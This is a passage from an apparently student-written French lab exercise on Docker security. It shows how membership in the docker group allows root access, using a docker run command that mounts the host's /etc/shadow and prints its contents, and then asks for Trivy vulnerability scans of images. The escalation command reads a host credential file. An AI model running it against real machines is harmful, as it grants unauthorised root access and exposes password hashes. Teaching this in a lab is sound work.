Cela découle sur le fait que vous avez les droits root sur la machine. Sans utiliser aucune commande sudo, sans devenir root, sans même connaître son mot de passe ni rien, si vous êtes membres du groupe docker vous pouvez devenir root sur la machine.
🌞 Prouvez que vous pouvez devenir root

en étant membre du groupe docker

sans taper aucune commande sudo ou su ou ce genre de choses
normalement, une seule commande docker run suffit
pour prouver que vous êtes root, plein de moyens possibles

par exemple un cat /etc/shadow qui contient les hash des mots de passe de la machine hôte
normalement, seul root peut le faire
```
sacha@test:~/partie3/app$ docker run -it -v /etc/shadow:/etc/shadow alpine sh
Unable to find image 'alpine:latest' locally
latest: Pulling from library/alpine
f18232174bc9: Already exists
Digest: sha256:a8560b36e8b8210634f77d9f7f9efd7ffa463e380b75e2e74aff4511df3ef88c
Status: Downloaded newer image for alpine:latest
/ # cat /etc/shadow
root:*:20140:0:99999:7:::
daemon:*:20140:0:99999:7:::
bin:*:20140:0:99999:7:::
sys:*:20140:0:99999:7:::
sync:*:20140:0:99999:7:::
...
```

2. Scan de vuln
Il existe des outils dédiés au scan de vulnérabilités dans des images Docker.
C'est le cas de Trivy par exemple.
🌞 Utilisez Trivy

effectuez un scan de vulnérabilités sur des images précédemment mises en oeuvre :

celle de WikiJS que vous avez build
celle de sa base de données
l'image de Apache que vous avez build
l'image de NGINX officielle utilisée dans la première partie
